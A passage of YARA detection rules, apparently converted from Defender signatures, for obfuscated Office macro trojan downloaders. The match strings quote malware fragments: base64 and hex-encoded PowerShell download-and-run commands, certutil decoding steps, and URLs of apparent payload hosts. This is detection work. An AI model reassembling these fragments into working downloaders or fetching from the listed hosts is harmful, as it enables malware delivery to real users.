        $x_1_4 = "Replace(IhqsD5ZyBdlISF, \".\", qDzN7pyzLd)" ascii //weight: 1
        $x_1_5 = "txtFlex.SelStart = MuR1Oqkl - 1" ascii //weight: 1
        $x_1_6 = "Set palimernh = New WshShell" ascii //weight: 1
        $x_1_7 = "efpodaksddn.WriteLine (paern.aloie)" ascii //weight: 1
        $x_1_8 = "efpodaksddn.Close" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FED_2147765381_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FED!MTB"
        threat_id = "2147765381"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "57 53 63 72 69 70 74 2E 53 68 65 6C 6C\")).Run" ascii //weight: 1
        $x_1_2 = "cG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLVcgSGlkZGVuIC1jb21tYW5kIChuZXctb2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJw==" ascii //weight: 1
        $x_1_3 = "JywkZW52OlRlbXArJ1xwdXR0eS5leGUnKTsoTmV3LU9iamVjdCAtY29tIFNoZWxsLkFwcGxpY2F0aW9uKS5TaGVsbEV4ZWN1dGUoJGVudjpUZW1wKydccHV0dHkuZXhlJyk=" ascii //weight: 1
        $x_1_4 = "nGroup" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JAA_2147765392_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JAA!MTB"
        threat_id = "2147765392"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 73 76 63 68 6f 73 74 33 32 2e 65 78 65" ascii //weight: 2
        $x_1_2 = "4d 69 63 72 6f 73 6f 66 74 2e 58 4d 4c 48 54 54 50" ascii //weight: 1
        $x_1_3 = "57 53 63 72 69 70 74 2e 53 68 65 6c 6c" ascii //weight: 1
        $x_1_4 = {43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-100] 2c 20 [0-100] 2c 20 32 29}  //weight: 1, accuracy: Low
        $x_1_5 = "Open \"G\" + \"E\" + \"T\", Url, False" ascii //weight: 1
        $x_1_6 = "ActiveCell.FormulaR1C1 = \"S\" & Chr(10) & \"u\" & Chr(10) & \"m\" & Chr(10) & \"r\" & Chr(10) & \"r\" & Chr(10) & \"y\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GJ_2147765401_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GJ!MTB"
        threat_id = "2147765401"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Run RUNCMD" ascii //weight: 1
        $x_1_2 = "43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 73 76 63 68 6f 73 74 33 32 2e 65 78 65" ascii //weight: 1
        $x_1_3 = "57 53 63 72 69 70 74 2e 53 68 65 6c 6c" ascii //weight: 1
        $x_1_4 = "68 74 74 70 3A 2F 2F 74 68 6F 64 69 61 63 61 6D 72 61 6E 68 2E 63 6F 6D 2F 6B 61 73 68 2E 65 78 65" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JAB_2147765402_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JAB!MTB"
        threat_id = "2147765402"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "aHR0cDovL29uZWRyaXZlLmxpdmUuY29tL2Rvd25sb2FkP2NpZD0xODU3OTk1M0YyNDNEOTc5JnJlc2lkPTE4NTc5OTUzRjI0M0Q5NzklMjExMjYmYXV0aGtleT1BSXVQMHgteTE3dldZd1U=" ascii //weight: 1
        $x_1_2 = "cG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLVcgSGlkZGVuIC1jb21tYW5kIChuZXctb2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJw==" ascii //weight: 1
        $x_1_3 = "JywkZW52OlRlbXArJ1xzdmNob3N0LmV4ZScpOyhOZXctT2JqZWN0IC1jb20gU2hlbGwuQXBwbGljYXRpb24pLlNoZWxsRXhlY3V0ZSgkZW52OlRlbXArJ1xzdmNob3N0LmV4ZScp" ascii //weight: 1
        $x_1_4 = {4d 69 64 24 28 [0-100] 2c 20 [0-100] 2c 20 32 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BN_2147765410_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BN!MTB"
        threat_id = "2147765410"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-60] 28 22 34 64 20 36 39 20 36 33 20 37 32 20 36 66 20 37 33 20 36 66 20 36 36 20 37 34 20 32 65 20 35 38 20 34 64 20 34 63 20 34 38 20 35 34 20 35 34 20 35 30 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-60] 28 22 35 37 20 35 33 20 36 33 20 37 32 20 36 39 20 37 30 20 37 34 20 32 65 20 35 33 20 36 38 20 36 35 20 36 63 20 36 63 22 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "(\"43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 69 62 78 6D 61 66 62 6D 64 2e 65 78 65\")" ascii //weight: 1
        $x_1_4 = "68 74 74 70 73 3A 2F 2F 6B 6E 69 74 7A 6F 6E 65 67 72 6F 75 70 2E 63 6F 6D 2F 7A 61 66 61 72 2E 65 78 65" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PCC_2147765476_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PCC!MTB"
        threat_id = "2147765476"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 52 4c 44 6f [0-4] 44 [0-4] 73 [0-4] 64 54 6f 46 69 6c 65 41 [0-4] 77 6e 6c 6f 61 [0-4] 75 52 [0-4] 6c 4d 6f 6e [0-4] 4a 4a 43 43 4a 4a [0-4] 44 74 72 75 68 [0-4] 4a 4a 43 43 43 43 4a [0-4] 54 72 6f 6c 61 73 65 [0-4] 50 72 6f 74 6f [0-4] 46 69 6c 65 [0-4] 6e 64 6c 65 72 [0-4] 63 6f 6c 48 61 [0-4] 52 4c [0-4] 55}  //weight: 1, accuracy: Low
        $x_1_2 = {43 3a 5c 50 72 6f [0-4] 67 72 61 6d [0-4] 44 61 [0-4] 74 61 5c [0-4] 54 72 69 6f 6c [0-4] 65 78 70 6c [0-4] 6f 72 65 72 [0-6] 68 74 74 70 3a 2f 2f [0-48] 2e [0-5] 2f 32 34 2e 67 69 66}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JAD_2147765819_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JAD!MTB"
        threat_id = "2147765819"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 61 6e 67 65 28 22 41 31 22 29 2e 56 61 6c 75 65 20 3d 20 22 43 61 6d 62 69 61 6e 64 6f 20 65 6c 20 74 61 6d 61 f1 6f 20 64 65 20 65 73 74 65 20 64 6f 63 75 6d 65 6e 74 6f 2c 20 65 73 70 65 72 65}  //weight: 1, accuracy: High
        $x_1_2 = "Open \"get\", Decrypt(\"q~~zG<<" ascii //weight: 1
        $x_1_3 = {43 68 72 28 41 73 63 28 4d 69 64 28 [0-200] 2c 20 [0-200] 2c 20 31 29 29 20 2d 20 31 33 29}  //weight: 1, accuracy: Low
        $x_1_4 = {44 65 63 72 79 70 74 20 26 20 4d 69 64 28 [0-200] 2c 20 [0-200] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_5 = {53 70 65 63 69 61 6c 50 61 74 68 20 2b 20 44 65 63 72 79 70 74 28 22 [0-15] 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JAE_2147765868_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JAE!MTB"
        threat_id = "2147765868"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4d 69 64 28 [0-8] 2c 20 [0-8] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_2 = "Split(\"p:\\jvaqbjf\\flfgrz32\\zfugn.rkr|P:\\hfref\\choyvp\\va.pbz|P:\\hfref\\choyvp\\va.ugzy\", \"|\")" ascii //weight: 1
        $x_1_3 = {52 65 70 6c 61 63 65 28 [0-8] 2c 20 [0-8] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {56 42 41 2e 43 68 72 28 [0-8] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_YBA_2147765942_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.YBA!MTB"
        threat_id = "2147765942"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "iwr http://weeshoppi.com/wp-includes/ID3/z/76020.jpg" ascii //weight: 1
        $x_1_2 = "Start-Process -FilePath \"C:\\Users\\Public\\pqavvyh.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAG_2147766010_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAG!MTB"
        threat_id = "2147766010"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass  -command" ascii //weight: 1
        $x_1_2 = {68 74 74 70 [0-2] 3a 2f 2f [0-48] 2f [0-16] 2e 65 78 65 20 2d 4f 75 74 46 69 6c 65 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c [0-80] 2e 65 78 65 7d 3b}  //weight: 1, accuracy: Low
        $x_1_3 = {53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 2d 46 69 6c 65 50 61 74 68 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c [0-80] 2e 65 78 65 22 7d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JAG_2147766240_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JAG!MTB"
        threat_id = "2147766240"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "lpow_dmow = \"p" ascii //weight: 1
        $x_1_2 = "kok_xwokf = \"h" ascii //weight: 1
        $x_1_3 = "kook = \"t" ascii //weight: 1
        $x_1_4 = "okal2s = \"s:/" ascii //weight: 1
        $x_1_5 = "p_ckw = \"/%3812%3812%3812%3812%3812@j.mp\\asdg786352ghjdgvbsafdghas" ascii //weight: 1
        $x_1_6 = "p_ckw = \"/%3812%3812%3812%3812%3812%3812%3812%3812%3812@j.mp\\dasr67u523gvdajmsbcmzxcghfsad" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAL_2147766245_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAL!MTB"
        threat_id = "2147766245"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_4_1 = "http://blog.vokasidev.com/crun20.gif" ascii //weight: 4
        $x_4_2 = "http://jabba.fun/crun20.gif" ascii //weight: 4
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_4 = {43 3a 5c 43 4f 73 75 76 5c [0-16] 5c [0-21] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_5 = "ShellExecuteA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_4_*) and 3 of ($x_1_*))) or
            ((2 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_JAH_2147766581_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JAH!MTB"
        threat_id = "2147766581"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "http://enginotelfinike.com/19.gif" ascii //weight: 2
        $x_2_2 = "C:\\WErtu\\Reterd\\szvmhegu.exe" ascii //weight: 2
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_4 = "ShellExecuteA" ascii //weight: 1
        $x_1_5 = "CreateDirectory" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JAK_2147766811_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JAK!MTB"
        threat_id = "2147766811"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "Start-Sleep 17" ascii //weight: 2
        $x_2_2 = "EXEC(\"cmd /c p^owershell -w 1 (nEw-oBjecT Net.WebcL`IENt)" ascii //weight: 2
        $x_2_3 = {63 64 20 24 65 6e 56 60 3a 54 45 4d 60 50 3b 20 2e 5c [0-6] 2e 62 61 74 22 29}  //weight: 2, accuracy: Low
        $x_1_4 = {28 27 44 6f 77 6e 27 2b 27 6c 6f 61 64 46 69 6c 65 27 29 2e 22 22 49 6e 76 6f 6b 65 22 22 28 27 68 74 74 70 73 3a 2f 2f 74 69 6e 79 75 72 6c 2e 63 6f 6d 2f 79 32 73 77 65 75 7a 63 27 2c 27 [0-6] 2e 62 61 74 27 29 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {28 27 44 6f 77 6e 27 2b 27 6c 6f 61 64 46 69 6c 65 27 29 2e 22 22 49 6e 76 6f 6b 65 22 22 28 27 68 74 74 70 73 3a 2f 2f 74 69 6e 79 75 72 6c 2e 63 6f 6d 2f 79 79 66 76 68 6a 6d 76 27 2c 27 [0-6] 2e 62 61 74 27 29 22 29}  //weight: 1, accuracy: Low
        $x_1_6 = {28 27 44 6f 77 6e 27 2b 27 6c 6f 61 64 46 69 6c 65 27 29 2e 22 22 49 6e 76 6f 6b 65 22 22 28 27 68 74 74 70 73 3a 2f 2f 74 69 6e 79 75 72 6c 2e 63 6f 6d 2f 79 79 39 35 64 70 32 68 27 2c 27 [0-6] 2e 62 61 74 27 29 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 3 of ($x_1_*))) or
            ((3 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_JAJ_2147766997_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JAJ!MTB"
        threat_id = "2147766997"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 74 72 43 6f 6e 76 28 [0-8] 2c 20 76 62 55 6e 69 63 6f 64 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = {4d 69 64 28 [0-8] 2c 20 [0-15] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 65 78 65 63 28 [0-8] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 70 6c 69 74 28 [0-8] 2c 20 [0-8] 29}  //weight: 1, accuracy: Low
        $x_1_5 = "As String = \"scripting.file" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JAL_2147767066_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JAL!MTB"
        threat_id = "2147767066"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {68 74 74 70 3a 2f 2f 37 39 2e 31 34 31 2e 31 36 35 2e 31 37 33 2f 44 58 2f 46 44 2d [0-6] 2e 6a 70 67}  //weight: 2, accuracy: Low
        $x_2_2 = {53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 2d 46 69 6c 65 50 61 74 68 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c [0-15] 2e 65 78 65}  //weight: 2, accuracy: Low
        $x_1_3 = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass  -command" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DW_2147767468_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DW!MTB"
        threat_id = "2147767468"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Scripting.FileSystemObject\"" ascii //weight: 1
        $x_1_2 = "cplusconsole.txt\", True" ascii //weight: 1
        $x_1_3 = ".Write cell.Value" ascii //weight: 1
        $x_1_4 = "certutil -decode cplusconsole.txt" ascii //weight: 1
        $x_1_5 = "Shell \"cmd.exe /c start cplusconsole.jpg\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DT_2147767471_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DT!MTB"
        threat_id = "2147767471"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Scripting.FileSystemObject\"" ascii //weight: 1
        $x_1_2 = "MsgBox \"file exists\"" ascii //weight: 1
        $x_1_3 = "cplusconsole111.jpg\", True)" ascii //weight: 1
        $x_1_4 = "certutil -decode cplusconsole.txt" ascii //weight: 1
        $x_1_5 = "Shell \"cmd.exe /c start cplusconsole.jpg\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JAM_2147767711_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JAM!MTB"
        threat_id = "2147767711"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "pdas3 = \"t\" + \"a ht" ascii //weight: 1
        $x_1_2 = "ko4d = \"tp://%748237%728748@j.mp/" ascii //weight: 1
        $x_1_3 = "okffr = \"dhksad7iasdahmnsgdhsad" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JAQ_2147767878_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JAQ!MTB"
        threat_id = "2147767878"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_2 = {68 74 74 70 3a 2f 2f 73 70 61 72 65 70 61 72 74 69 72 61 6e 2e 63 6f 6d 2f 6a 73 2f 73 30 2f [0-15] 2e 6a 70 67}  //weight: 1, accuracy: Low
        $x_1_3 = {43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 22 20 2b 22 [0-46] 2e 65 78 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HA_2147767948_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HA!MTB"
        threat_id = "2147767948"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Environ(rrrrr) & xxxxxxxxxx" ascii //weight: 1
        $x_1_2 = "ShellndirObj As Shell32.Shell" ascii //weight: 1
        $x_1_3 = "Bypass -windowstyle hidden -File" ascii //weight: 1
        $x_1_4 = "ShellObj.ShellExecute ee" ascii //weight: 1
        $x_1_5 = "fs.CreateTextFile(Pt" ascii //weight: 1
        $x_1_6 = "g1 = \"Gnmmbnfhhfgfgggg===" ascii //weight: 1
        $x_1_7 = "String(1, x6) + \".\" + String(1, x7)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RR_2147768074_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RR!MTB"
        threat_id = "2147768074"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Mid(strInput, first, 1) = Chr(Asc(Mid(strInput, first, 1)) - second)" ascii //weight: 1
        $x_1_2 = {25 39 39 39 25 39 39 39 40 6a 2e 6d 70 2f 61 73 64 6e 77 77 6f 64 70 77 70 6b 6b 6b 22 2f 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = "decrypt(\"p\", \"3\") + decrypt(\"|\", \"9\") + decrypt(\"o\", \"7\") + decrypt(\"}\", \"9\") + decrypt(\"c\", \"2\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JAU_2147768092_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JAU!MTB"
        threat_id = "2147768092"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {4b 01 00 00 65 01 00 00 72 01 00 00 6e 01 00 00 53 01 00 00 68 01 00 00 6c 01 00 00 45 01 00 00 78 01 00 00 63 01 00 00 75 01 00 00 74 01 00 00 41}  //weight: 1, accuracy: High
        $x_1_2 = "https://nomzoo.ml/ds/161120.gif" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JAU_2147768092_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JAU!MTB"
        threat_id = "2147768092"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 65 70 6c 61 63 65 28 [0-8] 2c 20 22 20 22 2c 20 22 22 2c 20 31 2c 20 2d 31 29}  //weight: 1, accuracy: Low
